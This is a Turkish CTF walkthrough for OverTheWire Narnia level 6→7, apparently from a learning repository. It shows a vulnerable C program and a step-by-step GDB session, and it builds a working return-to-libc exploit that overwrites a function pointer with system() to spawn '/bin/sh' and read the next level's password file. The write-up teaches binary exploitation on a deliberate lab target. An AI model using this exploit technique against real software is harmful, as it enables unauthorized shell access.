# 💥 OverTheWire Narnia — Level 6 → Level 7
## Return-to-libc: Fonksiyon Pointer'ını `system()`'e Çevirmek

> Overflow'a geri döndük ama yeni bir engel var: program, bir fonksiyon
> pointer'ının (`fp`) **stack'i gösterip göstermediğini** kontrol ediyor ve
> gösteriyorsa çıkıyor. Yani stack'teki shellcode'a atlayamayız. Üstüne
> environment de silinmiş. Tek çıkış: `fp`'yi zaten bellekte olan
> **`system()`** fonksiyonuna yöneltip ona `"/bin/sh"` argümanını vermek —
> klasik **return-to-libc**.

| | |
|---|---|
| **Bağlantı** | `ssh narnia6@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia6.c` · binary: `/narnia/narnia6` |
| **Kavram** | İki `strcpy` overflow → fonksiyon pointer ezme → return-to-libc (`system`) |
| **Zorluk** | ⭐⭐⭐⭐☆ |

**Bu level için gereken konular:**
- [`06_return_to_libc_ve_fonksiyon_pointer.md`](../../konu_anlatimlari/binary_exploitation/06_return_to_libc_ve_fonksiyon_pointer.md) — ret2libc + fonksiyon pointer (önce bunu oku!)
- [`01_bellek_ve_memory_layout.md`](../../konu_anlatimlari/binary_exploitation/01_bellek_ve_memory_layout.md) — bitişik buffer/pointer komşuluğu

---

## 🎯 Hedef

Program iki argüman alıp iki küçük buffer'a kopyalıyor; bu buffer'ların hemen üstünde `puts`'u gösteren bir fonksiyon pointer (`fp`) var. `b1`'i taşırıp `fp`'yi `system()`'e çevireceğiz, `b2`'yi taşırıp `b1`'i `"/bin/sh"` yapacağız — sonuçta `fp(b1)` çağrısı `system("/bin/sh")` olacak.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

extern char **environ;

// tired of fixing values... - morla
unsigned long get_sp(void) {                 // esp'nin üst byte'ını döndürür (stack ~0xff......)
    __asm__("movl %esp, %eax\n\t"
            "and $0xff000000, %eax");
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int (*fp)(char *) = (int(*)(char *))&puts, i;   // fp → puts

    if(argc != 3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    for(i=0; environ[i] != NULL; i++)               // tüm env değişkenlerini sil
        memset(environ[i], '\0', strlen(environ[i]));
    for(i=3; argv[i] != NULL; i++)                  // argv[3]+ varsa sil
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1, argv[1]);                            // ← AÇIK: b1'e kontrolsüz kopya
    strcpy(b2, argv[2]);                            // ← AÇIK: b2'ye kontrolsüz kopya

    if(((unsigned long)fp & 0xff000000) == get_sp())// fp stack'i mi gösteriyor?
        exit(-1);                                   // ← evetse ÇIK (stack'e atlamayı engeller)
    fp(b1);                                         // fp(b1): normalde puts(b1)

    exit(1);
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık ve Engel

**Açık:** İki sınırsız `strcpy`. `b1[8]` ve `b2[8]` küçük; argümanlar uzunsa taşar.

**Hedef:** `fp` — başlangıçta `puts`'u gösteren bir fonksiyon pointer. Stack'te düzen şöyle (yüksek adrese doğru):

```
Düşük adres → [ b2 (8) ][ b1 (8) ][ fp (4) ] → Yüksek adres
                ^b2 taşması b1'e ulaşır   ^b1 taşması fp'ye ulaşır
```

`b1`'i (8 byte) taşırınca hemen üstündeki **`fp`**'ye, `b2`'yi taşırınca **`b1`**'e ulaşırsın.

**Engeller (neden basit shellcode olmaz):**
1. **`environ` ve fazla `argv` siliniyor** → shellcode'u env değişkenine koyamazsın (narnia4'teki gibi).
2. **`get_sp()` koruması** → `fp` stack'i gösteriyorsa program çıkıyor; yani `fp`'yi stack'teki shellcode'a yönlendiremezsin.

> 🔑 **`get_sp()` tam olarak ne yapıyor?** `esp & 0xff000000` döndürür. 32-bit Linux'ta stack `0xffff....` civarındadır, yani `get_sp()` ≈ `0xff000000`. Kontrol şu:
> ```c
> if( (fp & 0xff000000) == get_sp() ) exit(-1);
> ```
> Eğer `fp` stack'i gösteriyorsa (`fp & 0xff000000 == 0xff000000`) program çıkar. **`system()` ise libc'dedir** (`0xf7......`), `system & 0xff000000 = 0xf7000000 ≠ 0xff000000` → kontrolü geçer. İşte bu yüzden tek yol `fp`'yi `system`'e yöneltmek.

---

## 📚 Gereken Teori: Return-to-libc

Stack'e kod koyup atlayamadığımızda (NX, ya da burada `get_sp` engeli), **zaten bellekte olan** bir kütüphane fonksiyonunu çağırırız. `system("/bin/sh")` bize shell verir; `system`'in adresini libc'den alır, `fp`'yi oraya yönlendiririz. Argümanı (`"/bin/sh"`) da `b1`'in içine yazarız — `fp(b1)` çağrıldığında `system(b1)` = `system("/bin/sh")` olur.

`environ` silinse bile **libc her zaman process'in adres uzayındadır** — bu yüzden ret2libc burada çalışır. Detay → [`06`](../../konu_anlatimlari/binary_exploitation/06_return_to_libc_ve_fonksiyon_pointer.md).

---

## 🧪 Adım Adım (GDB)

### Adım 1 — `system()`'in adresini bul

```bash
narnia6@narnia:/narnia$ gdb -q ./narnia6
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e62cd0 <system>     # ← sende FARKLI olabilir
```

`0xf7e62cd0` → little-endian → `\xd0\x2c\xe6\xf7`.

> ⚠️ `system`'in adresi sisteme/libc'ye göre değişir — **kendi binary'inde `p system` ile bul.** Adres null byte içermemeli (içeriyorsa `strcpy` orada kesilir; genelde içermez).

### Adım 2 — Stack sırasını doğrula (`[b2][b1][fp]`)

Dolgu uzunluklarını varsaymak yerine GDB'de teyit et. `strcpy`'lerden sonraya breakpoint koyup stack'e bak:

```bash
(gdb) disas main                       # iki strcpy'den sonraki, fp kontrolünden önceki adresi bul
(gdb) b *main+0x...                     # o adrese breakpoint
(gdb) run "$(python3 -c 'print("A"*8)')" "$(python3 -c 'print("B"*8)')"
(gdb) x/12wx $esp
0xffffd5a0: 0x42424242 0x42424242 ...   # ← b2 (B'ler)
0xffffd5a8: 0x41414141 0x41414141 ...   # ← b1 (A'lar), hemen üstünde
0xffffd5b0: 0x...<puts>                  # ← fp (henüz puts), b1'in hemen üstünde
```

Bu, `b2` → `b1` → `fp` sırasını ve aralarında dolgu olmadığını (her biri 8/8/4) doğrular.

### Adım 3 — Payload'u kur

```
argv[1] →  [ "A"*8 ] + [ system adresi ]    → b1'i doldur, fp'yi system yap
argv[2] →  [ "B"*8 ] + [ "/bin/sh" ]        → b2'yi doldur, b1'i "/bin/sh" yap

Çalışma sırası:
  strcpy(b1, argv[1]):  b1="AAAAAAAA", taşan 4 byte → fp = system
  strcpy(b2, argv[2]):  b2="BBBBBBBB", taşan 8 byte → b1 = "/bin/sh"
                        (b2 taşması yalnızca b1'e ulaşır, fp'ye değil → fp=system korunur)
  fp(b1)  ==  system("/bin/sh")  ✓
```

---

## ▶️ Çalıştırma

```bash
narnia6@narnia:/narnia$ ./narnia6 \
  "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*8 + b"\xd0\x2c\xe6\xf7")')" \
  "$(python3 -c 'import sys; sys.stdout.buffer.write(b"B"*8 + b"/bin/sh")')"
$ cat /etc/narnia_pass/narnia7
<şifre buraya gelir>
```

`fp` artık `system`, `b1` artık `"/bin/sh"` → `fp(b1)` = `system("/bin/sh")` → shell. Şifreyi al, narnia7'ye geç.

---

## ⚠️ Yaygın Hatalar / Tuzaklar

**1. `fp`'yi stack'teki shellcode'a yöneltmeye çalışmak.** `get_sp()` koruması bunu yakalar (`fp & 0xff000000 == 0xff000000` → exit). Tek yol libc'deki `system` (`0xf7...`).

**2. `system` adresini sabit/ezbere yazmak.** Sisteme göre değişir — `p system` ile **kendi** adresini al. Little-endian yazmayı unutma.

**3. İki argümanı vermemek.** `argc != 3` ise program "Usage" basıp çıkar. **İki** argüman şart (`b1` ve `b2`).

**4. `"/bin/sh"` için libc adresi aramak (gereksiz).** Burada `"/bin/sh"` string'ini doğrudan `b1`'in içine (b2 taşmasıyla) yazıyoruz; `system(b1)` onu okur. Ayrı bir libc `"/bin/sh"` adresine gerek yok.

**5. Dolgu uzunluğunu varsaymak.** `[b2][b1][fp]` sırası ve 8/8 dolgu derleyiciye bağlı — GDB ile doğrula (Adım 2).

**6. Adreste null byte.** `system` adresi veya offset'ler null içerirse `strcpy` orada keser. Genelde sorun olmaz ama kontrol et.

> 💡 **`get_sp()` neden böyle tuhaf yazılmış?** Fonksiyonun açık bir `return`'ü yok; `eax`'i ayarlayıp dönerek (x86 dönüş değeri konvansiyonu) `esp & 0xff000000`'ı döndürüyor. Teknik olarak çirkin/UB sınırında ama derleyici `eax`'i bozmadığı için pratikte çalışıyor (kaynak koddaki "morla" notu bunun bilinçli bir hile olduğunu söylüyor).

---

## ✅ Ne Öğrendik

- Bir **fonksiyon pointer**'ı bitişik bir buffer taşmasıyla ezilebilir; akışı istediğimiz fonksiyona çeviririz.
- Stack'e atlamak engellendiğinde (NX ya da burada `get_sp` kontrolü) **return-to-libc** devreye girer: mevcut `system()`'i çağırıp argümanını (`"/bin/sh"`) kontrol ettiğimiz bir buffer'a koyarız.
- `environ` silinse bile **libc adres uzayında kalır**, o yüzden `system` her zaman çağrılabilir.
- Birden çok overflow'u **çalışma sırasına göre** planlamak gerekir (önce `b1`→`fp`, sonra `b2`→`b1`; ikincisi birincisini bozmamalı).

Bir sonraki level format string ile fonksiyon pointer'ı birleştiriyor: `%n` kullanarak bir pointer'ı (`ptrf`) `hackedfunction`'a yönlendireceğiz.

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 5 → Level 6 — Format String Saldırısı](./narnia_5-6.md)
- **Sonraki:** [Level 7 → Level 8 — Format String → Fonksiyon Pointer](./narnia_7-8.md)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
